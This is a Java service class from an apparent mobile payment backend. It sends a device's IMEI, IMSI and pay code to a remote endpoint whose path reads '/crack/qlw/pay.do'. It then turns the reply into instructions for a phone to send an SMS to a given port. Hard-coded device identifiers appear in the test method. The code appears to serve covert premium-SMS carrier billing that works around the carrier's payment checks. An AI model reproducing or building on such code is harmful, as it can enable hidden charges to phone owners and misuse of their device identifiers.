package com.jxt.pay.appclient.service.dynamic.net;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Error;
import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Repeat;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;
import com.jxt.pay.appclient.utils.XmlUtils;


public class RlwDynamicService implements IDynamicService{
	private static Logger logger = Logger.getLogger(RlwDynamicService.class);
	
	private static final String TYPE = "rlw";
	
	private static final String URLPARAM = "ptid={ptid}&imei={imei}&imsi={imsi}&paycode={paycode}&cpparam={cpparam}&version=1.0.0";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	@Override
	public String getType() {
		return TYPE;
	}
	
	@Override
	public String dynamic(Map<String, String> map) {
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String cpparam = map.get("channel");
					
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			String ptid = StringUtils.defaultString(map.get("ptid"));
			String paycode = StringUtils.defaultString(map.get("paycode"));
			
			String param = URLPARAM.replace("{imsi}", imsi).replace("{imei}", imei).replace("{ptid}", ptid).replace("{paycode}", paycode).replace("{cpparam}", cpparam);
			
			String responseJson = GetData.getData(url,param);
	
			xml = parseXml(responseJson);
			
		}
		
		return xml;
	}
	
	private String parseXml(String responseJson){
		
		logger.info("responseJson:"+responseJson);
		
		if(responseJson != null && responseJson.length() > 0 ){
			String dest = "";
			String msg = "";
			
			try{
				JSONObject jo = new JSONObject(responseJson);
				int result = jo.getInt("result");
				
				if(0 == result){
					dest = jo.getString("port");
					msg = jo.getString("sms");
					
					Sms sms = new Sms();
					
					sms.setSmsContent(msg);
					sms.setSmsDest(dest);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					sms.setSendType("3");					
					
					return XstreamHelper.toXml(sms).toString();
				}else{
					return DynamicUtils.parseError(result+"");
				}
				
			}catch(Exception e){
				e.printStackTrace();
			}
		}

		return null;
	}
	
	
	public static void main(String[] args){
		
		test();
		
//		System.out.println(fetchSid("MM#WLAN#KjGDL0HmLvO27awoEZxqQw==#1022273555#399900003000"));
	}
	
	private static void test(){
//		http://124.172.237.77/MMSQLWMessage/getqlmocontent?appid=3038489&imei=862949029214504&imsi=460022101441340&paycode=30000873430704&cpid=36&chid=3003954714
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://mm.yiqiao580.com:9900/crack/qlw/pay.do");
		map.put("imei","867376023133651");
		map.put("imsi","460001123143655");
		map.put("channel", "10B201a087654321");
		map.put("ptid","13006");
		map.put("paycode","30000922838001");
		map.put("type","rlw");
		
		System.out.println(new RlwDynamicService().dynamic(map));
	}
	
}
